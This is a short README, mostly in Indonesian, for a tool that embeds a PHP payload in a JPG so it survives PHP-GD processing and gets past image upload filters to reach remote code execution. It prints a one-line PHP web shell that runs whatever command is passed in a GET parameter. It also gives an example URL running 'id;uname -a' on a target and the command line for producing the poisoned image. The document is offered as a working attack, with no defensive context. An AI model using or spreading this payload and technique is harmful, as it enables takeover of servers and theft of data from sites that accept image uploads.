# Bypass PHP-GD RCE
#### Bypassing image uploader use PHP-GD
#### Bypassing Via Injecting RCE Code In Image 

## Ubah gd.php dan ganti Payload/Kode yang ingin di inject ke gambar di LINE 8

```
$miniPayload = 'taruh payloadmu disini';
```
#### contoh payload yang dipake :

```
$miniPayload = '<?=`$_GET[0]`?>';
as
vuln.com/rce.jpg.php?0=id;uname -a
```
## How ?
```
php gd.php sample.jpg
```
#### jika sukses, maka ada file baru bernama payload_sample.jpg

# JPG ONLY !!!
